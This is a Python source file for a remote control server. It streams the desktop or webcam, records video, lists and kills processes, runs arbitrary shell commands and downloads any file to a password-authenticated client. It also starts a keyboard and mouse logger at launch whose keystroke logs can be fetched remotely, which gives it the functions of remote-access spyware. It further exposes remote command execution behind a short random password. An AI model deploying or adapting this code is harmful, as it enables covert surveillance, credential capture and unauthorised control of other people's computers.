import socket
import ssl
import cv2
import mss
import numpy as np
import pyautogui
import struct
import threading
import random
import psutil
import logging
import string
import json
import subprocess
import time
import re
import zipfile
import sys
from pathlib import Path
from pynput import keyboard, mouse

# --- CONFIGURATION & LOGGING ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class SystemHandler:
    """Handles processes and system applications."""
    @staticmethod
    def list_processes():
        return [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]

    @staticmethod
    def kill_process(pid):
        try:
            psutil.Process(pid).terminate()
            return "OK"
        except Exception as e:
            logging.error(f"Kill Proc Error: {e}")
            return "FAIL"

    @staticmethod
    def list_apps():
        apps = []
        search_paths = [
            Path("/usr/share/applications"),
            Path("/var/lib/snapd/desktop/applications"),
            Path.home() / ".local/share/applications"
        ]
        for p in search_paths:
            if p.exists():
                for f in p.glob("*.desktop"):
                    try:
                        with open(f, 'r', errors='ignore') as df:
                            content = df.read()
                            name = re.search(r'^Name=(.*)', content, re.M)
                            exec_c = re.search(r'^Exec=(.*)', content, re.M)
                            if name and exec_c:
                                apps.append({
                                    "name": name.group(1).strip(),
                                    "exec": re.sub(r'%[a-zA-Z]', '', exec_c.group(1)).strip(),
                                    "sw": "Application" in content
                                })
                    except: continue
        apps.sort(key=lambda x: x['sw'], reverse=True)
        return apps

    @staticmethod
    def start_app(exec_cmd):
        try:
            subprocess.Popen(exec_cmd, shell=True, start_new_session=True)
            return "OK"
        except Exception as e:
            logging.error(f"Start App Error: {e}")
            return "FAIL"

class FileHandler:
    """Handles file system operations."""
    @staticmethod
    def list_files(path_str):
        p = Path(path_str)
        files = []
        if p.exists() and p.is_dir():
            for item in p.iterdir():
                try:
                    files.append({
                        "name": item.name,
                        "is_dir": item.is_dir(),
                        "size": item.stat().st_size if not item.is_dir() else 0
                    })
                except: continue
        return files

    @staticmethod
    def prepare_download(path_str):
        p = Path(path_str)
        if p.is_dir():
            zip_p = Path("temp_download.zip")
            with zipfile.ZipFile(zip_p, 'w') as z:
                for file in p.rglob('*'):
                    z.write(file, file.relative_to(p))
            return zip_p
        return p if p.is_file() else None

class MediaHandler:
    """Handles screen capture, webcam, and recording."""
    def __init__(self):
        self.is_recording = False
        self.recorder = None
        self.record_path = Path("temp_record.mp4")

    def take_screenshot(self, mode="SCREEN"):
        with mss.mss() as sct:
            if mode == "WEBCAM":
                cap = cv2.VideoCapture(0)
                ret, img = cap.read()
                cap.release()
                if not ret: return None
            else:
                img = np.array(sct.grab(sct.monitors[1]))
                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            
            _, enc = cv2.imencode('.jpg', img)
            return enc.tobytes()

    def start_recording(self, mode="SCREEN"):
        self.is_recording = True
        self.recorder = cv2.VideoWriter(
            str(self.record_path), 
            cv2.VideoWriter_fourcc(*'mp4v'), 
            10, (1280, 720)
        )
        return "OK"

    def stop_recording(self):
        self.is_recording = False
        if self.recorder:
            self.recorder.release()
            self.recorder = None
        return self.record_path if self.record_path.exists() else None

class InputHandler:
    """Handles keyboard/mouse events and logging."""
    def __init__(self):
        self.logs = []
        self.k_listener = None
        self.m_listener = None

    def start_listeners(self):
        def on_press(key):
            try: self.logs.append(f"[{time.strftime('%H:%M:%S')}] Key: {key.char}")
            except: self.logs.append(f"[{time.strftime('%H:%M:%S')}] Special: {key}")
        def on_click(x, y, button, pressed):
            if pressed: self.logs.append(f"[{time.strftime('%H:%M:%S')}] Mouse {button} at ({x}, {y})")
        
        self.k_listener = keyboard.Listener(on_press=on_press)
        self.m_listener = mouse.Listener(on_click=on_click)
        self.k_listener.start()
        self.m_listener.start()

    def stop_listeners(self):
        if self.k_listener: self.k_listener.stop()
        if self.m_listener: self.m_listener.stop()

    def get_logs(self):
        current_logs = list(self.logs)
        self.logs.clear() # Optional: clear after fetching to keep it clean
        return current_logs

class ControlServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.port_stream = 9998
        self.port_cmd = 9999
        self.password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        self.running = True
        
        # Internal State
        self.is_streaming = False
        self.stream_mode = "SCREEN"
        
        # Modules
        self.media = MediaHandler()
        self.inputs = InputHandler()
        self.inputs.start_listeners()
        
        # SSL & Network
        self.ssl_context = self.setup_ssl()
        
        try:
            w, h = pyautogui.size()
            self.native_res = (w, h) if w > 0 else (1280, 720)
        except: self.native_res = (1280, 720)

        print(f"\n{'='*50}\nCONTROL SERVER - ONLINE\nIP: {self.get_local_ip()}\nPASS: {self.password}\n{'='*50}\n")

    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try: s.connect(('8.8.8.8', 1)); ip = s.getsockname()[0]
        except: ip = '127.0.0.1'
        finally: s.close()
        return ip

    def setup_ssl(self):
        cert_p, key_p = Path("server.crt"), Path("server.key")
        if not (cert_p.exists() and key_p.exists()):
            self.generate_certs(cert_p, key_p)
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain(certfile=cert_p, keyfile=key_p)
        return ctx

    def generate_certs(self, cert_p, key_p):
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, u"localhost")])
        cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(key.public_key()).serial_number(x509.random_serial_number()).not_valid_before(datetime.datetime.utcnow()).not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365)).sign(key, hashes.SHA256())
        with open(key_p, "wb") as f: f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
        with open(cert_p, "wb") as f: f.write(cert.public_bytes(serialization.Encoding.PEM))

    def stop(self):
        self.running = False
        self.inputs.stop_listeners()
        self.media.stop_recording()

    # --- NETWORK HANDLERS ---

    def stream_server(self):
        raw_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        raw_s.settimeout(1.0)
        raw_s.bind((self.host, self.port_stream))
        raw_s.listen(10)
        while self.running:
            try:
                conn, _ = raw_s.accept()
                secure_conn = self.ssl_context.wrap_socket(conn, server_side=True)
                threading.Thread(target=self.handle_stream, args=(secure_conn,), daemon=True).start()
            except socket.timeout: continue
            except Exception as e: logging.error(f"Stream Bind Error: {e}")

    def handle_stream(self, conn):
        camera = cv2.VideoCapture(0)
        with mss.mss() as sct:
            try:
                while self.running:
                    if self.stream_mode == "SCREEN":
                        img = np.array(sct.grab(sct.monitors[1]))
                        frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    else:
                        ret, frame = camera.read()
                        if not ret: frame = np.zeros((480, 640, 3), np.uint8)
                    
                    if self.media.is_recording and self.media.recorder:
                        self.media.recorder.write(cv2.resize(frame, (1280, 720)))

                    if not self.is_streaming:
                        time.sleep(0.5); continue
                    
                    _, enc = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 45])
                    data = enc.tobytes()
                    conn.sendall(struct.pack("!I", len(data)) + data)
            except: pass
            finally: conn.close(); camera.release()

    def command_server(self):
        raw_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        raw_s.settimeout(1.0)
        raw_s.bind((self.host, self.port_cmd))
        raw_s.listen(10)
        while self.running:
            try:
                conn, _ = raw_s.accept()
                secure_conn = self.ssl_context.wrap_socket(conn, server_side=True)
                threading.Thread(target=self.handle_command, args=(secure_conn,), daemon=True).start()
            except socket.timeout: continue
            except Exception as e: logging.error(f"Cmd Bind Error: {e}")

    def handle_command(self, conn):
        try:
            # Auth
            pwd = conn.recv(1024).decode()
            if pwd != self.password:
                res = json.dumps({"status": "FAIL", "msg": "Invalid Password"}).encode()
                conn.sendall(struct.pack("!I", len(res)) + res); conn.close(); return
            
            res = json.dumps({"status": "OK", "w": self.native_res[0], "h": self.native_res[1]}).encode()
            conn.sendall(struct.pack("!I", len(res)) + res)

            # Command Dispatcher Map
            dispatch = {
                "MOUSE": lambda c: pyautogui.click(c['x'], c['y'], button=c.get('btn', 'left')),
                "KEY": lambda c: pyautogui.press(c['key']),
                "STREAM_CTRL": self._cmd_stream_ctrl,
                "LIST_PROCS": lambda c: self._send_json(conn, SystemHandler.list_processes()),
                "KILL_PROC": lambda c: conn.sendall(SystemHandler.kill_process(c['pid']).encode()),
                "LIST_APPS": lambda c: self._send_json(conn, SystemHandler.list_apps()),
                "START_APP": lambda c: conn.sendall(SystemHandler.start_app(c['exec']).encode()),
                "LIST_FILES": lambda c: self._send_json(conn, FileHandler.list_files(c['path'])),
                "DOWNLOAD": lambda c: self._handle_download(conn, c['path']),
                "SCREENSHOT": lambda c: self._handle_screenshot(conn, c.get('mode', 'SCREEN')),
                "REC_START": lambda c: conn.sendall(self.media.start_recording(c.get('mode', 'SCREEN')).encode()),
                "REC_STOP": lambda c: self._handle_rec_stop(conn),
                "GET_LOGS": lambda c: self._send_json(conn, self.inputs.get_logs()),
            }

            while self.running:
                h = conn.recv(4)
                if not h: break
                sz = struct.unpack("!I", h)[0]
                req = self._recv_all(conn, sz)
                if not req: break
                cmd = json.loads(req.decode())
                
                # Execute mapped function
                func = dispatch.get(cmd['type'])
                if func: func(cmd)
                else: logging.warning(f"Unknown command: {cmd['type']}")
        except Exception as e: logging.error(f"Command Error: {e}")
        finally: conn.close()

    # --- COMMAND HELPERS ---

    def _cmd_stream_ctrl(self, cmd):
        self.is_streaming = cmd['active']
        self.stream_mode = cmd.get('mode', "SCREEN")

    def _handle_download(self, conn, path_str):
        p = FileHandler.prepare_download(path_str)
        if p and p.exists():
            sz = p.stat().st_size
            conn.sendall(struct.pack("!Q", sz))
            with open(p, "rb") as f:
                while chunk := f.read(32768): conn.sendall(chunk)
        else: conn.sendall(struct.pack("!Q", 0))

    def _handle_screenshot(self, conn, mode):
        data = self.media.take_screenshot(mode)
        if data: conn.sendall(struct.pack("!I", len(data)) + data)

    def _handle_rec_stop(self, conn):
        p = self.media.stop_recording()
        if p and p.exists():
            sz = p.stat().st_size
            conn.sendall(struct.pack("!Q", sz))
            with open(p, "rb") as f:
                while chunk := f.read(32768): conn.sendall(chunk)
        else: conn.sendall(struct.pack("!Q", 0))

    def _send_json(self, conn, data):
        p = json.dumps(data).encode('utf-8')
        conn.sendall(struct.pack("!I", len(p)) + p)

    def _recv_all(self, conn, n):
        data = b""
        while len(data) < n:
            chunk = conn.recv(min(n - len(data), 8192))
            if not chunk: return None
            data += chunk
        return data

if __name__ == "__main__":
    server = ControlServer()
    threading.Thread(target=server.stream_server, daemon=True).start()
    threading.Thread(target=server.command_server, daemon=True).start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        server.stop(); sys.exit(0)
